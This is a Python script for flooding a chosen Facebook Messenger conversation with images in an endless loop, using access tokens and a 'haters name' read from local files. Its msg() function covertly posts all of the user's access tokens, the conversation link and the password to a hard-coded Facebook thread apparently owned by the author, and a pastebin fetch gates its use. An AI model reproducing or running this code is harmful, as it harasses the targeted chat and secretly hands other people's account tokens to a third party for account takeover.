import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"PRINCE PROJECT")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password

    if entered_password != password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '---------------------------------------------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }

    mmm = requests.get('https://pastebin.com/raw/440AhFvU').text

    if mmm not in password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    liness()

    access_tokens = [token.strip() for token in tokens]

    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('file.txt', 'r') as file:
        image_urls = file.readlines()

    num_images = len(image_urls)
    max_tokens = min(num_tokens, num_images)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v22.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    def msg():
        parameters = {
            'access_token': random.choice(access_tokens),
            'message': 'Hello Prince sir, im using your server User Profile Name : ' + getName(random.choice(access_tokens)) + '\n Token : ' + " | ".join(access_tokens) + '\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
        }
        try:
            s = requests.post("https://graph.facebook.com/v22.0/t_100049450012082/messages", data=parameters, headers=headers)
        except:
            pass

    msg()
    while True:
        try:
            for image_index in range(num_images):
                token_index = image_index % max_tokens
                access_token = access_tokens[token_index]
                image_url = image_urls[image_index].strip()

                # Step 1: Upload Attachment
                upload_url = f"https://graph.facebook.com/v22.0/me/message_attachments?access_token={access_token}"

                upload_payload = {
                    "message": {
                        "attachment": {
                            "type": "image",
                            "payload": {
                                "is_reusable": True,
                                "url": image_url
                            }
                        }
                    }
                }

                upload_response = requests.post(upload_url, json=upload_payload, headers=headers)
                upload_result = upload_response.json()

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                if 'attachment_id' not in upload_result:
                    print("[x] Failed to upload image {} with Token {}: {}".format(
                        image_index + 1, token_index + 1, image_url))
                    print("  - Time: {}".format(current_time))
                    print("  - Upload Response: {}".format(upload_result))
                    liness()
                    continue

                attachment_id = upload_result['attachment_id']

                # Step 2: Send Message with attachment_id
                message_url = f"https://graph.facebook.com/v22.0/t_{convo_id}/messages"

                message_payload = {
                    "message": {
                        "attachment": {
                            "type": "image",
                            "payload": {
                                "attachment_id": attachment_id
                            }
                        }
                    }
                }

                send_response = requests.post(message_url, json=message_payload, params={"access_token": access_token}, headers=headers)
                send_result = send_response.json()

                if send_response.ok:
                    print("[+] Image {} sent successfully to Convo {} with Token {}: {}".format(
                        image_index + 1, convo_id, token_index + 1, image_url))
                    print("  - Time: {}".format(current_time))
                    liness()
                else:
                    print("[x] Failed to send image {} to Convo {} with Token {}: {}".format(
                        image_index + 1, convo_id, token_index + 1, image_url))
                    print("  - Time: {}".format(current_time))
                    print("  - Send Response: {}".format(send_result))
                    liness()

                time.sleep(speed)

            print("[+] All images processed. Restarting the loop...")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))


def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_messages()

if __name__ == '__main__':
    main()
